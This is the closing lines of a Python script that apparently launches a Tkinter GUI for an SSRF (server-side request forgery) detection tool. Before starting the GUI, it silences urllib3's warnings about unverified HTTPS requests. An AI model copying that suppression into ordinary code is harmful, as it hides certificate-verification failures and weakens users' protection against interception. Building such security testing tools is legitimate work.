
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    root = tk.Tk()
    app = SSRFDetectorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
